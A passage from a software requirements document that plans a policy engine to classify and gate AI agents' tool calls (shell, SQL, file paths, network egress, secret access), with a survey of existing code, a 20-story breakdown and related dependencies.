- `app/services/v1_translate.py`: `tools` and `tool_choice` are refused as `tools_not_supported` with the message `"tool calling is not supported (PRD-016)"`; `tool_calls` / `function_call` in a message and the `tool` role are refused with the same code.
- `app/services/openrouter_client.py`: reads only `choices[0].message.content`; a `None` content with `tool_calls` present raises `OpenRouterError` ending `"; tool calls are not supported (PRD-016)"`.
- `app/services/query_pipeline.py`: `_validate_conversation` raises `"tool turns are not supported (PRD-016)"`; the audit row writes `has_tool_calls=False` with a comment that no row can carry tool calls yet.
- `app/models/messages.py`: `Role` already includes `tool` "so PRD-016 does not have to widen the type"; the normalizer refuses `tool_calls`.
- `app/services/authz.py`: `_KNOWN_PERMISSIONS` is a closed set of five; `load()` refuses an unknown permission with `AuthzConfigError`; `authorize()` returns immediately when `RBAC_ENABLED` is false — the reason D7 adds `holds()`.
- `app/services/pattern_config.py`: wholesale replacement, `get_policy()` returning the built-in before `load()`, `_policy` rebound last; its `load()` docstring: "PyYAML resolves duplicate mapping keys silently … if a second YAML config arrives (PRD-015), a shared strict loader is the place to fix it once."
- `app/db/models.py`: `audit_logs` is one row per request; `has_tool_calls INTEGER NOT NULL DEFAULT 0` exists, "Always 0 until PRD-014 and PRD-016"; new tables (`usage_daily`, `chat_messages`) arrive by `CREATE` with no foreign key.
- `app/services/audit_logger.py`: `hash_prompt()` and a 500-character preview are the evidence convention.
- `app/main.py`: `init_db`, `pii_redactor.load`, `authz.load`, `pattern_config.load`, `pii_policy.load`, `check_bootstrap` in that order.
- `chat_ui/chat_ui/components/`: `register.py`, `summary.py`, `usage.py` under `admin_shell.py` — the Actions view is a fourth sibling.
- `requirements.txt`: `PyYAML` explicit; no `sqlglot`.
- `docs/roadmap.md` *Action policy rules*: the five classes, "a denial short-circuits **before** the action happens, returns a `reason` string the calling agent can display, and is logged with the same rigor as an allowed call", and "they are not built yet". The brief's link `../README.md#action-policy-rules` now resolves to `docs/roadmap.md#action-policy-rules`.

### Story breakdown (generated by `/create-stories`; files under `.agents/stories/PRD-016-action-policy-rules/`)
1. STORY-001 Action threat model and adapter survey (OpenCode, Cline, Aider), `SOURCES.md` (brief 1)
2. STORY-002 Retarget the six `(PRD-016)` runtime strings to `(PRD-017)` (D14)
3. STORY-003 Rule ids, operation kinds, six action permissions and `holds()` (D6, D7; brief 9 part)
4. STORY-004 `ToolCall`, `Operation`, the adapter layer and built-in mappings (brief 3)
5. STORY-005 Three settings; `strict_yaml`; `pattern_config` adopts it (D13)
6. STORY-006 `action_config` part 1: model, built-in policy, `get_policy()`, digest, both lifespans (brief 2)
7. STORY-007 `action_config` part 2: file load, per-id rule merge, validation, sample file (brief 2, D12)
8. STORY-008 SQL classifier with `sqlglot` (brief 4, D2)
9. STORY-009 Shell classifier part 1: reject-scan, tokenization, segments, unclassifiable (brief 5, D3, D5)
10. STORY-010 Shell classifier part 2: allowlist, destructive flags, interpreters, installs, services (brief 5, D3)
11. STORY-011 Filesystem path rules (brief 6, D11)
12. STORY-012 Network egress rules (brief 7)
13. STORY-013 Secret access rules and shell embedding for SQL, URLs and secrets (brief 8)
14. STORY-014 Decision engine: grants, severity, fail-closed boundary (brief 9, D9, D10)
15. STORY-015 `action_decisions` table, `record()`, read functions (brief 10, D8)
16. STORY-016 `GET /audit/actions` and `/stats` counts (brief 10)
17. STORY-017 Synthetic tool-call corpus and suite; latency measured (brief 11)
18. STORY-018 Evasion corpus (brief 12)
19. STORY-019 Admin console: Actions view (brief 13)
20. STORY-020 README, `docs/features.md`, `docs/roadmap.md`, `.env.example`; promotion verified (brief 14)

### Related documents
- PRD-005 (RBAC): `_KNOWN_PERMISSIONS`, `AuthzConfigError`, the `RBAC_ENABLED` escape hatch D7 refuses to inherit
- PRD-007 (Turso migration): `init_db()` and the both-lifespans rule
- PRD-011 (pattern policy): the loader shape, startup validation, corpora as files, `flag` as a rollout mode, and the deferred strict-YAML fix
- PRD-013 (audit & usage limits): `has_tool_calls`, the admin console's Usage view as the model for Actions
- PRD-015 (OpenAI-compatible endpoint): the `tools_not_supported` refusal and the numbering note this PRD continues
- PRD-017 (tool calling, brief PRE-PRD-016): the first caller

### Dependencies
- Depends on: PRD-011 (done). PRD-005 (done) for the permission vocabulary.
- Blocks: PRD-017

**Skills referenced:** frontend-design — applies to STORY-019 only (the Actions view). Its rule "Build with the brief's real content and subject matter throughout" applies in Section 11's quality indicator that the view renders real decision rows (deny first), and its direction to make "deliberate, opinionated choices … specific to this brief" is bounded here by the existing admin shell and theme, which the view reuses rather than restyles. No rule from it applies to Sections 6, 8 or 9.
